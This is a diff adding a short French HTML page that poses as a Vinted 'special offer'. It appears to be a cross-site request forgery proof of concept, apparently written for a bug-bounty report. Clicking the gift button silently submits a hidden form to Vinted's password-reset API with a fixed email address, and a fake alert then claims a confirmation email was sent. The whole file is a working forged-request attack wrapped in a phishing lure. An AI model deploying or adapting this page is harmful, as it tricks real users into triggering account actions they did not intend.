@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Vinted - Offre Spéciale</title>
+</head>
+<body>
+    <h1>Offre Spéciale Vinted 🎉</h1>
+    <p>Cliquez pour découvrir votre cadeau</p>
+    
+    <button onclick="openOffer()">Découvrir l'offre</button>
+
+    <script>
+        function openOffer() {
+            // Créer un formulaire dynamiquement
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'https://www.vinted.fr/api/v2/users/reset_password';
+            form.target = '_blank'; // Ouvre dans nouvelle fenêtre
+            
+            const input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = 'email';
+            input.value = 'raz_26+2@intigriti.me';
+            
+            form.appendChild(input);
+            document.body.appendChild(form);
+            form.submit();
+            
+            // Message pour l'utilisateur
+            setTimeout(() => {
+                alert('Un email de confirmation vous a été envoyé !');
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
